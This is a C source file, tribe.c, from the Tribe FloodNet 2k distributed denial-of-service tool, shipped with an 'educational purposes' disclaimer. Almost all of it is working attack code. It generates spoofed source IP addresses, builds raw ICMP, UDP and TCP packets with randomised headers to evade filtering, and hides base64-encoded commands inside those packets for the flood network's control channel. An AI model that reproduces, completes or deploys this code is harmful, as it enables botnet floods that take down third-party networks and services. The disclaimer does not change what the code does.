/*
 * Tribe FloodNet - 2k edition
 * by Mixter <mixter@newyorkoffice.com>
 *
 * tribe.c - common functions
 *
 * This program is distributed for educational purposes and without any
 * explicit or implicit warranty; in no event shall the author or
 * contributors be liable for any direct, indirect or incidental damages
 * arising in any way out of the use of this software.
 *
 */

#include "tribe.h"

int rcounter = 0;
char rseed[65535];
extern unsigned long myip;
extern int nospoof;

void 
random_init (void)
{
  int rfd = open ("/dev/urandom", O_RDONLY);
  if (rfd < 0)
    rfd = open ("/dev/random", O_RDONLY);
  rcounter = read (rfd, rseed, 65535);
  close (rfd);
}

inline
long 
getrandom (int min, int max)
{
  if (rcounter < 2)
    random_init ();
  srand (rseed[rcounter] + (rseed[rcounter - 1] << 8));
  rcounter -= 2;
  return ((random () % (int) (((max) + 1) - (min))) + (min));
}

void
trimbuf (char *buf)
{
  int i = 0;
  for (i = 0; i < strlen (buf); i++)
    if ((buf[i] == '\n') || (buf[i] == '\r'))
      buf[i] = '\0';
}

inline unsigned long
k00lip (void)
{
  struct in_addr hax0r;
  char convi[16];
  int a, b, c, d;

  if (nospoof < 1)
    return (unsigned long) (getrandom (0, 65535) + (getrandom (0, 65535) << 8));

  hax0r.s_addr = htonl (myip);

  sscanf (inet_ntoa (hax0r), "%d.%d.%d.%d", &a, &b, &c, &d);
  if (nospoof < 2)
    b = getrandom (1, 254);
  if (nospoof < 3)
    c = getrandom (1, 254);
  d = getrandom (1, 254);

  sprintf (convi, "%d.%d.%d.%d", a, b, c, d);

  return inet_addr (convi);
}

void 
tfntransmit (unsigned long from, unsigned long to, int proto, char id, char *target)
{
  char buf[BS], data[BS];
  struct ip *ih = (struct ip *) buf;
  struct icmp *ich = (struct icmp *) (buf + sizeof (struct ip));
  struct udp *udh = (struct udp *) (buf + sizeof (struct ip));
  struct tcp *tch = (struct tcp *) (buf + sizeof (struct ip));
  struct sa sin;
  char *p;
  int tot_len = sizeof (struct ip), ssock;

  memset (data, 0, BS);
  data[0] = PROTO_SEP;
  data[1] = id;
  data[2] = PROTO_SEP;
  strncpy (data + 3, target, BS - 3);

  sin.fam = AF_INET;
  sin.add = to;
  memset (buf, 0, BS);

  ih->ver = 4;
  ih->ihl = 5;
  ih->tos = 0x00;
  ih->tl = 0;
  ih->id = htons (getrandom (1024, 65535));
  ih->off = 0;
  ih->ttl = getrandom (200, 255);
  ih->sum = 0;
  ih->src = from;
  ih->dst = to;

  switch ((proto == -1) ? getrandom (0, 2) : proto)
    {
    case 0:
      tot_len += sizeof (struct icmp);
      ih->pro = ICMP;
      ssock = socket (AF_INET, SOCK_RAW, ICMP);
      p = buf + sizeof (struct ip) + sizeof (struct icmp);
      ich->type = 0;
      ich->code = 0;
      ich->id = getrandom (0, 1) ? getrandom (0, 65535) : 0;
      ich->seq = getrandom (0, 1) ? getrandom (0, 65535) : 0;
      ich->sum = 0;
      encode64 (data, p, strlen (data));
      tot_len += strlen (p);
      ich->sum = cksum ((u16 *) ich, tot_len >> 1);
      ih->tl = tot_len;
      sin.dp = htons (0);
      break;
    case 1:
      tot_len += sizeof (struct udp);
      ih->pro = UDP;
      ssock = socket (AF_INET, SOCK_RAW, UDP);
      p = buf + sizeof (struct ip) + sizeof (struct udp);
      udh->src = htons (getrandom (0, 65535));
      udh->dst = htons (getrandom (0, 65535));
      udh->sum = 0;
      encode64 (data, p, strlen (data));
      tot_len += strlen (p);
      udh->sum = cksum ((u16 *) udh, tot_len >> 1);
      udh->len = htons (sizeof (struct udp) + 3 + strlen (p));
      ih->tl = tot_len;
      sin.dp = htons (udh->dst);
      break;
    case 2:
      tot_len += sizeof (struct tcp);
      ih->pro = TCP;
      ssock = socket (AF_INET, SOCK_RAW, TCP);
      p = buf + sizeof (struct ip) + sizeof (struct tcp);
      tch->src = htons (getrandom (0, 65535));
      tch->dst = htons (getrandom (0, 65535));
      tch->seq = getrandom (0, 1) ? htonl (getrandom (0, 65535) + (getrandom (0, 65535) << 8)) : 0;
      tch->ack = getrandom (0, 1) ? htonl (getrandom (0, 65535) + (getrandom (0, 65535) << 8)) : 0;
      tch->off = 0;
      tch->flg = getrandom (0, 1) ? (getrandom (0, 1) ? SYN : ACK) : SYN | ACK;
      tch->win = getrandom (0, 1) ? htons (getrandom (0, 65535)) : 0;
      tch->urp = 0;
      tch->sum = 0;
      encode64 (data, p, strlen (data));
      tot_len += strlen (p);
      tch->sum = cksum ((u16 *) tch, tot_len >> 1);
      ih->tl = tot_len;
      sin.dp = htons (tch->dst);
      break;
    default:
      exit (0);
      break;
    }

  setsockopt (ssock, IP, IP_HDRINCL, "1", sizeof ("1"));
  if (sendto (ssock, buf, tot_len, 0, (struct sockaddr *) &sin, sizeof (sin)) < 0)
    perror ("sendto");

  close (ssock);
}

#ifdef ATTACKLOG
void
dbug (char *s)
{
  int f = open (ATTACKLOG, O_WRONLY | O_APPEND | O_CREAT);
  write (f, s, strlen (s));
  close (f);
}
#endif
